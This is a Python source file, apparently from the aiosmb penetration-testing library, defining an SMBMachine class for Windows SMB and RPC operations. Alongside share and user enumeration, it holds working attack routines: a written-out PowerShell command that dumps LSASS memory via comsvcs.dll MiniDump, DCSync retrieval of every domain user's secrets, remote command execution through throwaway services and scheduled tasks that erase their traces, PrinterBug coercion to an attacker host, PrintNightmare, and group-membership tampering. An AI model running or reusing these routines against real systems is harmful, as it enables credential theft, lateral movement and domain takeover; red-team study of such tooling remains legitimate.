
import asyncio
import ntpath
import os

from aiosmb import logger
from aiosmb.commons.interfaces.share import SMBShare
from aiosmb.commons.interfaces.session import SMBUserSession
from aiosmb.commons.interfaces.file import SMBFile
from aiosmb.commons.interfaces.directory import SMBDirectory
from aiosmb.dcerpc.v5.interfaces.srvsmgr import SRVSRPC
from aiosmb.dcerpc.v5.interfaces.samrmgr import SAMRRPC
from aiosmb.dcerpc.v5.interfaces.lsatmgr import LSADRPC
from aiosmb.dcerpc.v5.interfaces.drsuapimgr import DRSUAPIRPC
from aiosmb.dcerpc.v5.interfaces.servicemanager import REMSVCRPC
from aiosmb.dcerpc.v5.interfaces.remoteregistry import RRPRPC
from aiosmb.dcerpc.v5.interfaces.rprnmgr import RPRNRPC
from aiosmb.dcerpc.v5.interfaces.tschmgr import TSCHRPC
from aiosmb.dcerpc.v5.interfaces.parmgr import PARRPC
from aiosmb.dcerpc.v5.interfaces.wkstmgr import WKSTRPC
from aiosmb.dcerpc.v5.dtypes import RPC_SID


from aiosmb.dcerpc.v5 import tsch, scmr

from aiosmb.commons.exceptions import SMBMachineException

from aiosmb.commons.interfaces.blocking.file.file import SMBBlockingFileMgr
from aiosmb.commons.interfaces.blocking.file.blockingfile import SMBBlockingFile
from aiosmb.commons.utils.apq import AsyncProcessQueue
from aiosmb.protocol.smb2.commands.ioctl import CtlCode, IOCTLREQFlags

from aiosmb.dcerpc.v5.rprn import PRINTER_CHANGE_ADD_JOB

class SMBMachine:
	def __init__(self, connection, print_cb = None, force_rpc_auth = None):
		self.connection = connection
		self.print_cb = print_cb
		self.force_rpc_auth = force_rpc_auth
		self.services = []
		self.shares = []
		self.localgroups = []
		self.sessions = []
		self.domains = []

		self.privtable = {}
		self.blocking_mgr_tasks = {}

		self.named_rpcs = {}
		self.named_rpcs_proto = {
			'SRVS' : SRVSRPC,
			'SAMR' : SAMRRPC,
			'LSAD' : LSADRPC,
			'RRP'  : RRPRPC,
			'RPRN' : RPRNRPC,
			'TSCH' : TSCHRPC,
			'PAR'  : PARRPC,
			'SERVICEMGR' : REMSVCRPC,
			'WKST' : WKSTRPC,
		}

		self.open_rpcs = {}


	async def __aenter__(self):
		return self
		
	async def __aexit__(self, exc_type, exc, traceback):
		try:
			await asyncio.wait_for(self.close(), timeout = 5)
		except:
			pass

	async def close(self):
		for name in self.open_rpcs:
			await self.named_rpcs[name].close()
		self.open_rpcs = {}


	def get_blocking_file(self):
		"""
		Please don't ever use this
		Starts a file manager task and initializes the io queues
		"""

		in_q = AsyncProcessQueue()
		out_q = AsyncProcessQueue()
		fsm = SMBBlockingFileMgr(self.connection, in_q, out_q)
		fsmt = asyncio.create_task(fsm.run())
		self.blocking_mgr_tasks[fsmt] = 1
		bfile = SMBBlockingFile(in_q, out_q)
		return bfile

	async def connect_rpc(self, service_name, reconnect = False):
		try:
			if service_name not in self.named_rpcs_proto:
				raise Exception('Unknown service name : %s' % service_name)
			
			if service_name in self.open_rpcs and reconnect is False:
				#print('Tried to reopen service %s' % service_name)
				return True, None
			
			if service_name in ['PAR', 'RPRN','SRVS','SAMR','RRP','TSCH', 'LSAD', 'SERVICEMGR', 'WKST']: #new service interface
				self.named_rpcs[service_name], err = await self.named_rpcs_proto[service_name].from_smbconnection(self.connection, auth_level = self.force_rpc_auth)
			else:
				self.named_rpcs[service_name] = self.named_rpcs_proto[service_name](self.connection)
				_, err = await self.named_rpcs[service_name].connect()
			if err is not None:
				raise err
			
			self.open_rpcs[service_name] = True

			return True, None
		except Exception as e:
			return False, e

	
	async def list_shares(self, fetch_share_sd = False):
		try:
			_, err = await self.connect_rpc('SRVS')
			if err is not None:
				raise err

			async for name, share_type, remark, err in self.named_rpcs['SRVS'].list_shares():
				if err is not None:
					yield None, err
					return
				share = SMBShare(
					name = name, 
					stype = share_type, 
					remark = remark, 
					fullpath = '\\\\%s\\%s' % (self.connection.target.get_hostname_or_ip(), name)
				)
				if fetch_share_sd is True:
					await share.get_security_descriptor(self.connection)

				yield share, None
		except Exception as e:
			yield None, e

	async def list_sessions(self, level = 10):
		try:
			_, err = await self.connect_rpc('SRVS')
			if err is not None:
				raise err

			async for username, ip_addr, err in self.named_rpcs['SRVS'].list_sessions(level = level):
				if err is not None:
					yield None, err
					return
				sess = SMBUserSession(username = username, ip_addr = ip_addr.replace('\\','').strip())
				self.sessions.append(sess)
				yield sess, None
		except Exception as e:
			yield None, e

	async def wkstlist_sessions(self, level = 1):
		try:
			_, err = await self.connect_rpc('WKST')
			if err is not None:
				raise err

			async for username, ip_addr, err in self.named_rpcs['WKST'].list_sessions(level = level):
				if err is not None:
					yield None, err
					return
				sess = SMBUserSession(username = username)
				self.sessions.append(sess)
				yield sess, None
		except Exception as e:
			yield None, e

	async def list_domains(self):
		try:
			_, err = await self.connect_rpc('SAMR')
			if err is not None:
				raise err
			async for domain, err in self.named_rpcs['SAMR'].list_domains():
				#self.domains.append(domain)
				yield domain, err
		except Exception as e:
			yield None, e
	
	async def list_localgroups(self):
		try:
			_, err = await self.connect_rpc('SAMR')
			if err is not None:
				raise err
			async for name, sid, err in self.list_groups('Builtin'):
				yield name, sid, err
		except Exception as e:
			yield None, None, e

	async def list_groups(self, domain_name, ret_sid = True):
		"""
		Lists all groups in a given domain.
		domain_name: string
		"""
		try:
			_, err = await self.connect_rpc('SAMR')
			if err is not None:
				raise err
			domain_sid, err = await self.named_rpcs['SAMR'].get_domain_sid(domain_name)
			if err is not None:
				raise err
			domain_handle, err = await self.named_rpcs['SAMR'].open_domain(domain_sid)
			if err is not None:
				raise err
			async for name, rid, err in self.named_rpcs['SAMR'].list_aliases(domain_handle):
				if err is not None:
					raise err
				sid = '%s-%s' % (domain_sid, rid)
				yield name, sid, None
		
		except Exception as e:
			yield None, None, e

	async def list_group_members(self, domain_name, group_name):
		try:
			_, err = await self.connect_rpc('SAMR')
			if err is not None:
				raise err
			_, err = await self.connect_rpc('LSAD')
			if err is not None:
				raise err
			policy_handle, err = await self.named_rpcs['LSAD'].open_policy2()
			if err is not None:
				raise err
			domain_sid, err = await self.named_rpcs['SAMR'].get_domain_sid(domain_name)
			if err is not None:
				raise err
			domain_handle, err = await self.named_rpcs['SAMR'].open_domain(domain_sid)
			if err is not None:
				raise err
			target_group_rid = None
			async for name, rid, err in self.named_rpcs['SAMR'].list_aliases(domain_handle):
				if err is not None:
					raise err
				if name == group_name:
					target_group_rid = rid
					break

			if target_group_rid is None:
				raise Exception('No group found with name "%s"' % group_name)
			
			alias_handle, err = await self.named_rpcs['SAMR'].open_alias(domain_handle, target_group_rid)
			if err is not None:
				raise err

			async for sid, err in self.named_rpcs['SAMR'].list_alias_members(alias_handle):
				if err is not None:
					raise err
				
				async for domain_name, user_name, err in self.named_rpcs['LSAD'].lookup_sids(policy_handle, [sid]):
					if err is not None:
						raise err
					yield domain_name, user_name, sid, None
		
		except Exception as e:
			yield None, None, None, e

	async def add_sid_to_group(self, domain_name, group_name, sid):
		try:
			_, err = await self.connect_rpc('SAMR')
			if err is not None:
				raise err
			_, err = await self.connect_rpc('LSAD')
			if err is not None:
				raise err
			policy_handle, err = await self.named_rpcs['LSAD'].open_policy2()
			if err is not None:
				raise err
			domain_sid, err = await self.named_rpcs['SAMR'].get_domain_sid(domain_name)
			if err is not None:
				raise err
			domain_handle, err = await self.named_rpcs['SAMR'].open_domain(domain_sid)
			if err is not None:
				raise err
			target_group_rid = None
			async for name, rid, err in self.named_rpcs['SAMR'].list_aliases(domain_handle):
				if err is not None:
					raise err

				if name == group_name:
					target_group_rid = rid
					break

			if target_group_rid is None:
				raise Exception('No group found with name "%s"' % group_name)
			
			alias_handle, err = await self.named_rpcs['SAMR'].open_alias(domain_handle, target_group_rid)
			if err is not None:
				raise err
			targetsid = RPC_SID()
			targetsid.fromCanonical(sid)
			result, err = await self.named_rpcs['SAMR'].add_member_to_alias(alias_handle, targetsid)
			if err is not None:
				raise err
			return result, None
		except Exception as e:
			return False, e		

	async def list_directory(self, directory):
		_, err = await directory.list(self.connection)
		if err is not None:
			yield False, err
			return
		
		for entry in directory.get_console_output():
			yield entry

	async def enum_all_recursively(self, depth = 3, maxentries = None, exclude_share=['print$', 'PRINT$'], exclude_dir=[], fetch_share_sd = False, fetch_dir_sd = False, fetch_file_sd = False):
		shares = {}
		async for share, err in self.list_shares(fetch_share_sd):
			if err is not None:
				raise err
			if share.name.upper() == 'IPC$':
				continue
			shares[share.name] = share
			yield share, 'share', None

		for share_name in shares:
			if share_name in exclude_share:
				continue

			_, err = await shares[share_name].connect(self.connection)
			if err is not None:
				continue
				raise err

			async for entry in shares[share_name].subdirs[''].list_r(self.connection, depth = depth, maxentries = maxentries, fetch_dir_sd = fetch_dir_sd, fetch_file_sd = fetch_file_sd, exclude_dir = exclude_dir):
				yield entry
				await asyncio.sleep(0)

	async def put_file(self, local_path, remote_path):
		"""
		remote_path must be a full UNC path with the file name included!

		"""
		try:
			smbfile = SMBFile.from_remotepath(self.connection, remote_path)
			_, err = await smbfile.open(self.connection, 'w')
			if err is not None:
				return False, err

			with open(local_path, 'rb') as f:
				total_writen, err = await smbfile.write_buffer(f)

			await smbfile.close()
			return total_writen, None
		except Exception as e:
			return False, e

	async def get_file(self, out_path, file_obj):
		with open(out_path, 'wb') as f:
			try:
				await file_obj.open(self.connection, 'r')
				while True:
					data = await file_obj.read(1024)
					if not data:
						break
					f.write(data)
			finally:
				await file_obj.close()

	async def get_file_data(self, file_obj):
		_, err = await file_obj.open(self.connection, 'r')
		if err is not None:
			yield None, err
			return
		async for data, err in file_obj.read_chunked():
			yield data, err

	async def del_file(self, file_path):
		return await SMBFile.delete_rempath(self.connection, file_path)
	
	async def del_directory_path(self, dir_path):
		return await SMBDirectory.delete_unc(self.connection, dir_path)

	async def create_subdirectory(self, directory_name, parent_directory_obj):
		await parent_directory_obj.create_subdir(directory_name, self.connection)
		

	async def list_services(self):
		try:
			_, err = await self.connect_rpc('SERVICEMGR')
			if err is not None:
				raise err
			
			async for service, err in self.named_rpcs['SERVICEMGR'].list():
				if err is not None:
					raise err
				yield service, None
		
		except Exception as e:
			yield None, e

	async def enable_service(self, service_name):
		try:
			_, err = await self.connect_rpc('SERVICEMGR')
			if err is not None:
				raise err

			res, exc = await self.named_rpcs['SERVICEMGR'].enable_service(service_name)
			return res, exc
		except Exception as e:
			return None, e

	async def list_domain_users(self, target_domain = None):
		try:
			_, err = await self.connect_rpc('SAMR')
			if err is not None:
				raise err

			if target_domain is None:
				logger.debug('No domain defined, fetching it from SAMR')
						
								
				logger.debug('Fetching domains...')
				async for domain, err in self.named_rpcs['SAMR'].list_domains():
					if err is not None:
						raise err

					if domain == 'Builtin':
						continue
					if target_domain is None: #using th first available
						target_domain = domain
						logger.debug('Domain available: %s' % domain)

			domain_sid, err = await self.named_rpcs['SAMR'].get_domain_sid(target_domain)
			if err is not None:
				raise err
			domain_handle, err = await self.named_rpcs['SAMR'].open_domain(domain_sid)
			if err is not None:
				raise err
			
			async for username, user_sid, err in self.named_rpcs['SAMR'].list_domain_users(domain_handle):
				yield username, user_sid, err
		
		except Exception as e:
			yield None, None, e

	async def dcsync(self, target_domain = None, target_users = []):
		try:
			if isinstance(target_users, str):
				target_users = [target_users]
			
			_, err = await self.connect_rpc('SAMR')
			if err is not None:
				raise err
			

			if target_domain is None:
				logger.debug('No domain defined, fetching it from SAMR')
				
				logger.debug('Fetching domains...')
				async for domain, err in self.named_rpcs['SAMR'].list_domains():
					if err is not None:
						raise err
					if domain == 'Builtin':
						continue
					if target_domain is None: #using th first available
						target_domain = domain
						logger.debug('Domain available: %s' % domain)
			
			drsuapi, err = await DRSUAPIRPC.from_smbconnection(self.connection, domain = target_domain)
			if err is not None:
				raise err

			async with drsuapi:
				logger.debug('Using domain: %s' % target_domain)
				if len(target_users) > 0:
					for username in target_users:
						secrets, err = await drsuapi.get_user_secrets(username)
						yield secrets, err
								
				else:
					
					domain_sid, err = await self.named_rpcs['SAMR'].get_domain_sid(target_domain)
					if err is not None:
						raise err
					domain_handle, err = await self.named_rpcs['SAMR'].open_domain(domain_sid)
					if err is not None:
						raise err
					async for username, user_sid, err in self.named_rpcs['SAMR'].list_domain_users(domain_handle):
						if err is not None:
							yield None, err
							return
						logger.debug('username: %s' % username)
						secrets, err = await drsuapi.get_user_secrets(username)
						if err is not None:
							yield None, err
							return
						logger.debug('secrets: %s' % secrets)
						yield secrets, None

		except Exception as e:
			yield None, e
			return

	
	async def get_regapi(self):
		try:
			_, err = await self.connect_rpc('RRP')
			if err is not None:
				raise err
			return self.named_rpcs['RRP'], None
		except Exception as e:
			return None, e

	async def save_registry_hive(self, hive_name, remote_path):
		try:
			_, err = await self.connect_rpc('RRP')
			if err is not None:
				raise err
			key_handle, err = await self.named_rpcs['RRP'].OpenRegPath(hive_name)
			if err is not None:
				return None, err
			res, err = await self.named_rpcs['RRP'].SaveKey(key_handle, remote_path)
			return res, err
		except Exception as e:
			return None, e

	async def reg_list_users(self):
		"""
		Lists user SIDs available in the HKLM\\USERS hive
		"""
		try:
			_, err = await self.connect_rpc('RRP')
			if err is not None:
				raise err

			users, err = await self.named_rpcs['RRP'].ListUsers()
			if err is not None:
				return None, err
			return users, err
		except Exception as e:
			return None, e
		
	
	async def service_dump_lsass(self, lsass_file_name = None, silent = False):
		try:
			_, err = await self.connect_rpc('SERVICEMGR')
			if err is not None:
				raise err

			if lsass_file_name is None:
				lsass_file_name = os.urandom(4).hex() + '.arj'
			command = "powershell.exe -NoP -C \"%%windir%%\\System32\\rundll32.exe %%windir%%\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id \\Windows\\Temp\\%s full;Wait-Process -Id (Get-Process rundll32).id\"" % lsass_file_name
			service_name = os.urandom(4).hex()
			display_name = service_name

			batch_file = os.urandom(4).hex() + '.bat'
			#totally not from impacket
			command = '%%COMSPEC%% /Q /c echo %s  2^>^&1 > %s & %%COMSPEC%% /Q /c %s & del %s' % (command, batch_file, batch_file, batch_file)

			logger.debug('Service: %s' % service_name)
			logger.debug('Command: %s' % command)
			#return None, None
		
			res, err = await self.named_rpcs['SERVICEMGR'].create_service(service_name, display_name, command, scmr.SERVICE_DEMAND_START)
			if err is not None:
				raise err
			
			if silent is False:
				if self.print_cb is not None:
					await self.print_cb('[%s] Service created with name: %s' % (self.connection.target.get_hostname_or_ip(), service_name))
				else:
					print('[%s] Service created with name: %s' % (self.connection.target.get_hostname_or_ip(), service_name))
			
			_, err = await self.start_service(service_name)

			for _ in range(5):
				await asyncio.sleep(5)
				temp = SMBFile.from_remotepath(self.connection, '\\ADMIN$\\Temp\\%s' % lsass_file_name)
				_, err = await temp.open(self.connection)
				if err is not None:
					continue
				if silent is False:
					if self.print_cb is not None:
						await self.print_cb('[%s] Dump file is now accessible here: C:\\Windows\\Temp\\%s' % (self.connection.target.get_hostname_or_ip(), lsass_file_name))
					else:
						print('[%s] Dump file is now accessible here: C:\\Windows\\Temp\\%s' % (self.connection.target.get_hostname_or_ip(), lsass_file_name))
				return temp, None

			return None, err
		except Exception as e:
			return None, e
		finally:
			_, err = await self.delete_service(service_name)
			if err is not None:
				logger.debug('Failed to delete service!')
				if silent is False:
					if self.print_cb is not None:
						await self.print_cb('[%s] Failed to remove service: %s' % (self.connection.target.get_hostname_or_ip(), service_name))
					else:
						print('[%s] Failed to remove service: %s' % (self.connection.target.get_hostname_or_ip(), service_name))
			else:
				if silent is False:
					if self.print_cb is not None:
						await self.print_cb('[%s] Removed service: %s' % (self.connection.target.get_hostname_or_ip(), service_name))
					else:
						print('[%s] Removed service: %s' % (self.connection.target.get_hostname_or_ip(), service_name))

	
	async def service_cmd_exec(self, command, display_name = None, service_name = None, result_wait_timeout = 1):
		"""
		Creates a service and starts it.
		Does not create files! there is a separate command for that!
		"""
		
		try:
			handle, err = await self.named_rpcs_proto['SERVICEMGR'].from_smbconnection(self.connection, auth_level = self.force_rpc_auth)
			if err is not None:
				raise err

			if service_name is None:
				service_name = os.urandom(4).hex()
			if display_name is None:
				display_name = service_name

			batch_file = os.urandom(4).hex() + '.bat'
			temp_file_name = os.urandom(4).hex()
			temp_file_location = '\\ADMIN$\\temp\\%s' % temp_file_name
			temp_location = '%%windir%%\\temp\\%s' % (temp_file_name)

			#totally not from impacket
			command = '%%COMSPEC%% /Q /c echo %s  ^>  %s 2^>^&1 > %s & %%COMSPEC%% /Q /c %s & del %s' % (command, temp_location, batch_file, batch_file, batch_file)

			logger.debug('Command: %s' % command)

		
			res, err = await handle.create_service(service_name, display_name, command, scmr.SERVICE_DEMAND_START)
			if err is not None:
				raise err
			
			#logger.debug('Service created. Name: %s' % service_name)
			print('Service created. Name: %s' % service_name)
			
			_, err = await handle.start_service(service_name)
			#if err is not None:
			#	raise err

			err = None
			for _ in range(5):
				logger.debug('Opening temp file. Path: %s' % temp_file_location)
				temp = SMBFile.from_remotepath(self.connection, temp_file_location)
				_, err = await temp.open(self.connection)
				if err is not None:
					await asyncio.sleep(result_wait_timeout)
					continue
				break
			else:
				raise err

			async for data, err in temp.read_chunked():
				if err is not None:
					logger.debug('Temp file read failed!')
					raise err
				if data is None:
					break

				yield data, err
			
			await handle.close()

			logger.debug('Deleting service...')
			_, err = await handle.delete_service(service_name)
			if err is not None:
				logger.warning('Failed to delete service!')

			logger.debug('Deleting temp file...')
			_, err = await temp.delete()
			if err is not None:
				logger.warning('Failed to delete temp file!')

			yield None, None

		except Exception as e:
			yield None, e
	
	async def create_service(self, service_name, command, display_name = None, starttype = scmr.SERVICE_AUTO_START):
		"""
		Creates a service and starts it.
		Does not create files! there is a separate command for that!
		"""
		try:
			_, err = await self.connect_rpc('SERVICEMGR')
			if err is not None:
				raise err

			if display_name is None:
				display_name = service_name
			res, err = await self.named_rpcs['SERVICEMGR'].create_service(service_name, display_name, command, starttype = starttype)
			return res, err
		except Exception as e:
			return None, e

	async def start_service(self, service_name):
		"""
		Creates a service and starts it.
		Does not create files! there is a separate command for that!
		"""
		try:
			_, err = await self.connect_rpc('SERVICEMGR')
			if err is not None:
				raise err
			return await self.named_rpcs['SERVICEMGR'].start_service(service_name)
		except Exception as e:
			return None, e
	
	async def stop_service(self, service_name):
		"""
		Creates a service and starts it.
		Does not create files! there is a separate command for that!
		"""
		try:
			_, err = await self.connect_rpc('SERVICEMGR')
			if err is not None:
				raise err
			return await self.named_rpcs['SERVICEMGR'].stop_service(service_name)
		except Exception as e:
			return None, e
	
	async def delete_service(self, service_name):
		"""
		Creates a service and starts it.
		Does not create files! there is a separate command for that!
		"""
		try:
			_, err = await self.connect_rpc('SERVICEMGR')
			if err is not None:
				raise err
			return await self.named_rpcs['SERVICEMGR'].delete_service(service_name)
		except Exception as e:
			return None, e


	async def deploy_service(self, path_to_executable, remote_path = None, service_name = None):
		"""

		remote path must be UNC
		"""
		try:
			_, err = await self.connect_rpc('SERVICEMGR')
			if err is not None:
				raise err

			if service_name is None:
				service_name = os.urandom(4).hex()
			if remote_path is None:
				raise NotImplementedError()

			filename = ntpath.basename(path_to_executable)
			remote_file_path = remote_path + filename
			remote_file = SMBFile.from_uncpath(remote_file_path)
			await self.put_file(path_to_executable, remote_file)
			
			command = remote_file_path

			await self.create_service(service_name, command)

			return True, None
		except Exception as e:
			return None, e
	

	async def tasks_list(self):
		"""
		Lists scheduled tasks
		"""
		try:
			_, err = await self.connect_rpc('TSCH')
			if err is not None:
				raise err
			async for task, err in self.named_rpcs['TSCH'].list_tasks():
				yield task, err
		except Exception as e:
			yield None, e

	async def tasks_register(self, template, task_name = None, flags = tsch.TASK_CREATE, sddl = None, logon_type = tsch.TASK_LOGON_NONE):
		"""
		Registers a new task
		"""
		try:
			_, err = await self.connect_rpc('TSCH')
			if err is not None:
				raise err

			return await self.named_rpcs['TSCH'].register_task(template, task_name = task_name, flags = flags, sddl = sddl, logon_type = logon_type)
		except Exception as e:
			return None, e


	async def tasks_execute_commands(self, commands):
		try:
			_, err = await self.connect_rpc('TSCH')
			if err is not None:
				raise err

			return await self.named_rpcs['TSCH'].run_commands(commands)
		except Exception as e:
			return None, e
	
	async def tasks_cmd_exec(self, command, result_wait_timeout = 1):
		try:
			_, err = await self.connect_rpc('TSCH')
			if err is not None:
				raise err

			temp_file_name = os.urandom(4).hex()
			temp_file_location = '\\ADMIN$\\temp\\%s' % temp_file_name
			temp_location = '%%windir%%\\temp\\%s' % (temp_file_name)

			if self.print_cb is not None:
				await self.print_cb('[%s] Temp file location: %s' % (self.connection.target.get_hostname_or_ip(), temp_location))

			#totally not from impacket
			command = '%s  >  %s 2>&1' % (command, temp_location)

			logger.debug('Command: %s' % command)
			if self.print_cb is not None:
				await self.print_cb('[%s] Registering new task and executing command...' % self.connection.target.get_hostname_or_ip())

			res, err = await self.named_rpcs['TSCH'].run_commands([command])
			if err is not None:
				raise err
			
			if self.print_cb is not None:
				await self.print_cb('[%s] Task executed OK! Waiting for output file' % self.connection.target.get_hostname_or_ip())
			
			err = None
			for _ in range(10):
				logger.debug('Opening temp file. Path: %s' % temp_file_location)
				temp = SMBFile.from_remotepath(self.connection, temp_file_location)
				_, err = await temp.open(self.connection)
				if err is not None:
					await asyncio.sleep(result_wait_timeout)
					continue
				break
			else:
				raise err

			if self.print_cb is not None:
				await self.print_cb('[%s] Got output file, reading...' % self.connection.target.get_hostname_or_ip())
			async for data, err in temp.read_chunked():
				if err is not None:
					logger.debug('Temp file read failed!')
					raise err
				if data is None:
					break

				yield data, err
			
			logger.debug('Deleting temp file...')
			if self.print_cb is not None:
				await self.print_cb('[%s] Deleting temp file...' % self.connection.target.get_hostname_or_ip())
			_, err = await temp.delete()
			if err is not None:
				logger.debug('Failed to delete temp file!')
				if self.print_cb is not None:
					await self.print_cb('[%s] Failed to delete temp file!' % self.connection.target.get_hostname_or_ip())
			
			yield None, None

		except Exception as e:
			yield None, e

	async def tasks_delete(self, task_name):
		try:
			_, err = await self.connect_rpc('TSCH')
			if err is not None:
				raise err
			
			return await self.named_rpcs['TSCH'].delete_task(task_name)
		except Exception as e:
			return None, e

	
	async def task_dump_lsass(self, lsass_file_name = None, silent = False):
		try:
			_, err = await self.connect_rpc('TSCH')
			if err is not None:
				raise err
			if lsass_file_name is None:
				lsass_file_name = os.urandom(4).hex() + '.arj'
			command = "powershell.exe -NoP -C \"%%windir%%\\System32\\rundll32.exe %%windir%%\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id \\Windows\\Temp\\%s full;Wait-Process -Id (Get-Process rundll32).id\"" % lsass_file_name

			logger.debug('Command: %s' % command)
			
			res, err = await self.tasks_execute_commands([command])
			if err is not None:
				raise err
			
			if silent is False:
				if self.print_cb is not None:
					await self.print_cb('[%s] Dumping task created on remote end, now waiting...' % self.connection.target.get_hostname_or_ip())
				else:
					print('[%s] Dumping task created on remote end, now waiting...' % self.connection.target.get_hostname_or_ip())

			for _ in range(5):
				await asyncio.sleep(5)
				temp = SMBFile.from_remotepath(self.connection, '\\ADMIN$\\Temp\\%s' % lsass_file_name)
				_, err = await temp.open(self.connection)
				if err is not None:
					continue
				if silent is False:
					if self.print_cb is not None:
						await self.print_cb('[%s] Remote file location: C:\\Windows\\Temp\\%s' % (self.connection.target.get_hostname_or_ip() ,lsass_file_name))
					else:
						print('[%s] Remote file location: C:\\Windows\\Temp\\%s' % (self.connection.target.get_hostname_or_ip() ,lsass_file_name))
				return temp, None

			return None, err
		except Exception as e:
			return None, e

	async def printerbug(self, attacker_host):
		"""
		Creates a service and starts it.
		Does not create files! there is a separate command for that!
		"""
		try:
			_, err = await self.connect_rpc('RPRN')
			if err is not None:
				raise err

			if self.print_cb is not None:
				await self.print_cb('opening printer')
			else:
				print('opening printer')
			handle, err = await self.named_rpcs['RPRN'].open_printer('\\\\%s\x00' % self.connection.target.get_hostname_or_ip())
			if err is not None:
				raise err
			resp, err = await self.named_rpcs['RPRN'].hRpcRemoteFindFirstPrinterChangeNotificationEx(
				handle,
				PRINTER_CHANGE_ADD_JOB,
				pszLocalMachine = '\\\\%s\x00' % attacker_host,

			)
			if err is not None:
				raise err
			return True, None
		except Exception as e:
			return None, e
	
	
	async def enum_printer_drivers(self, environments = "Windows x64", level = 2, name = ''):
		try:
			_, err = await self.connect_rpc('RPRN')
			if err is not None:
				raise err
			return await self.named_rpcs['RPRN'].enum_drivers(environments, level = level, name = name)
		except Exception as e:
			return None, e

	async def printnightmare(self, share, driverpath, environments = "Windows x64", silent= False):
		try:
			_, err = await self.connect_rpc('RPRN')
			if err is not None:
				raise err
			return await self.named_rpcs['RPRN'].printnightmare(share, driverpath = driverpath, environments = environments, silent = silent)
		except Exception as e:
			return None, e

	async def par_printnightmare(self, share, driverpath, environments = "Windows x64", silent= False):
		try:
			_, err = await self.connect_rpc('PAR')
			if err is not None:
				raise err
			return await self.named_rpcs['PAR'].printnightmare(share, driverpath = driverpath, environments = environments, silent = silent)
		except Exception as e:
			return None, e

	async def list_interfaces(self):
		try:
			interfaces = []
			ipc_file = SMBFile.from_uncpath('\\\\%s\\IPC$' % self.connection.target.get_hostname_or_ip())
			await ipc_file.open(self.connection, 'r')
			ifaces_raw, err = await self.connection.ioctl(ipc_file.tree_id, b'\xFF'*16, CtlCode.FSCTL_QUERY_NETWORK_INTERFACE_INFO, data = None, flags = IOCTLREQFlags.IS_FSCTL)
			if err is not None:
				raise err

			for iface_raw in ifaces_raw:
				t = {
					'index' : iface_raw.IfIndex,
					'cap' : iface_raw.Capability,
					'speed' : iface_raw.LinkSpeed,
					'address' : str(iface_raw.SockAddr_Storage.Addr),
				}
				interfaces.append(t)
			
			return interfaces, None


		except Exception as e:
			return None, e

		finally:
			await ipc_file.close()
	
	async def check_service_status(self, service_name):
		try:
			_, err = await self.connect_rpc('SERVICEMGR')
			if err is not None:
				raise err
			return await self.named_rpcs['SERVICEMGR'].check_service_status(service_name)
		except Exception as e:
			return None, e
	
	async def get_backupkeys(self):
		try:
			_, err = await self.connect_rpc('LSAD')
			if err is not None:
				raise err
			return await self.named_rpcs['LSAD'].get_backupkeys()
		except Exception as e:
			return None, e
	

	#### TODO SECTION

	async def list_mountpoints(self):
		pass
	
